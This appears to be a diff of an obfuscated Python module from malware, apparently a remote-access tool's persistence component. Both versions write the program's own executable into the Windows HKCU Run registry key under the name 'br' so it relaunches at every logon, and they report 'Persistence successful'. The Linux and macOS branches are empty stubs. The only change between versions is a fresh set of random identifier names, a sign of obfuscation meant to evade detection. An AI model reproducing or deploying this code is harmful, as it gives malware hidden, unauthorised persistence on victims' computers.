@@ -1,32 +1,32 @@
 # -*- coding: utf-8 -*-
 import sys
-def kaQxqqkYcmjNyWBvtadEeIWLiezNAhyc():
+def uUyZWkHWSOdTYfilpwjnhelPsDppMZFE():
     import _winreg
     from _winreg import HKEY_CURRENT_USER as HKCU
-    OkdLLRXbNXHVbXvbgRPbHdsdlJCYLxbf = r'Software\Microsoft\Windows\CurrentVersion\Run'
-    QNAhnhOIwvprbqUeQHSqTIyqinMZhsIN = sys.executable
+    cfBWzFKsECElgKOHfyhJWcFojnxQuhbT = r'Software\Microsoft\Windows\CurrentVersion\Run'
+    JCySfyrnzOSTWLQJAqDkIRxRCUgayRHg = sys.executable
     try:
-        vxzBpBFBaRicKhsmMdJzuHwKnlExOezF = _winreg.OpenKey(HKCU, OkdLLRXbNXHVbXvbgRPbHdsdlJCYLxbf, 0, _winreg.KEY_WRITE)
-        _winreg.SetValueEx(vxzBpBFBaRicKhsmMdJzuHwKnlExOezF, 'br', 0, _winreg.REG_SZ, QNAhnhOIwvprbqUeQHSqTIyqinMZhsIN)
-        _winreg.CloseKey(vxzBpBFBaRicKhsmMdJzuHwKnlExOezF)
+        hTntgLtpCQtAiicYCchfnpjeqeIOuThh = _winreg.OpenKey(HKCU, cfBWzFKsECElgKOHfyhJWcFojnxQuhbT, 0, _winreg.KEY_WRITE)
+        _winreg.SetValueEx(hTntgLtpCQtAiicYCchfnpjeqeIOuThh, 'br', 0, _winreg.REG_SZ, JCySfyrnzOSTWLQJAqDkIRxRCUgayRHg)
+        _winreg.CloseKey(hTntgLtpCQtAiicYCchfnpjeqeIOuThh)
         return True, 'HKCU Run registry key applied'
     except WindowsError:
         return False, 'HKCU Run registry key failed'
-def CGIxlVLUGSZlwOJEEDQYDpLjyofNtPOC():
+def MmClNGqwhErzmiAgMdrHpsJUATDDnTJb():
     return False, 'nothing here yet'
-def TdhGqlcrgxtCwXOgkGaybIxpcZUxSfnZ():
+def cAUhiiReMzPEGqivGinLAYeTuXdzHQWN():
     return False, 'nothing here yet'
-def ARakDxFSUheNtJlTHfcXYGrHeJqrDiaq(plat_type):
+def xWTiZYjcGlRKZbqRTGUReTzzfBOPCzBz(plat_type):
     if plat_type.startswith('win'):
-        cBeqtnMiHpDQVNUiXmShdWRfRTfuUzyo, DrRiiYarhdzHCfkRySlqLSUaigXJXviN = kaQxqqkYcmjNyWBvtadEeIWLiezNAhyc()
+        YfEyZddYudTLwgepZUQxPvQGgLXQejFV, TecLfOsrCYWEkewZNGaiwHTEjCfrNFAy = uUyZWkHWSOdTYfilpwjnhelPsDppMZFE()
     elif plat_type.startswith('linux'):
-        cBeqtnMiHpDQVNUiXmShdWRfRTfuUzyo, DrRiiYarhdzHCfkRySlqLSUaigXJXviN = CGIxlVLUGSZlwOJEEDQYDpLjyofNtPOC()
+        YfEyZddYudTLwgepZUQxPvQGgLXQejFV, TecLfOsrCYWEkewZNGaiwHTEjCfrNFAy = MmClNGqwhErzmiAgMdrHpsJUATDDnTJb()
     elif plat_type.startswith('darwin'):
-        cBeqtnMiHpDQVNUiXmShdWRfRTfuUzyo, DrRiiYarhdzHCfkRySlqLSUaigXJXviN = TdhGqlcrgxtCwXOgkGaybIxpcZUxSfnZ()
+        YfEyZddYudTLwgepZUQxPvQGgLXQejFV, TecLfOsrCYWEkewZNGaiwHTEjCfrNFAy = cAUhiiReMzPEGqivGinLAYeTuXdzHQWN()
     else:
         return 'Error, platform unsupported.'
-    if cBeqtnMiHpDQVNUiXmShdWRfRTfuUzyo:
-        UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM = 'Persistence successful, {}.'.format(DrRiiYarhdzHCfkRySlqLSUaigXJXviN)
+    if YfEyZddYudTLwgepZUQxPvQGgLXQejFV:
+        clbTiTFqUxkqbuQVZtaTgDqCquqcATPC = 'Persistence successful, {}.'.format(TecLfOsrCYWEkewZNGaiwHTEjCfrNFAy)
     else:
-        UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM = 'Persistence unsuccessful, {}.'.format(DrRiiYarhdzHCfkRySlqLSUaigXJXviN)
-    return UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM
+        clbTiTFqUxkqbuQVZtaTgDqCquqcATPC = 'Persistence unsuccessful, {}.'.format(TecLfOsrCYWEkewZNGaiwHTEjCfrNFAy)
+    return clbTiTFqUxkqbuQVZtaTgDqCquqcATPC
